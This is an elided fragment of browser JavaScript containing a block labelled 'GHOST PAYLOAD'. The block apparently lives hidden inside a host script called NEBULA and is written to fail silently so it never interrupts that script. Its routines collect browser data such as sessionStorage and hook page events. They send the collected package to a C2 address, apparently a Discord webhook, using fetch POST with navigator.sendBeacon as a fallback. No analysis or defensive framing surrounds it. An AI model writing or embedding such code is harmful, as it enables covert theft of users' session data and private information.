(function () {
  ...
  // ============================================================
  // ☠️ GHOST PAYLOAD — Wrapped in try-catch, Discord-optimized
  // ============================================================
  (function() {
    ...
    const payload = {
      init: function() {
        try {
          ...
          // silently fail — NEVER block NEBULA
        }
      },
      grabAll: function() {
        try {
          ...
          } catch(e) { pkg.sessionStorage = "err"; }
          this.send(pkg);
        } catch(e) {}
      },
      hookEvents: function() {
      ...
      send: function(data) {
        try {
          ...
          // Method 1: fetch POST (Discord-optimized)
          try {
            fetch(C2 + "?wait=false", {
              method: "POST",
              body: discordPayload,
          ...
          if(navigator.sendBeacon) {
            try {
              const blob = new Blob([discordPayload], {type: "application/json"});
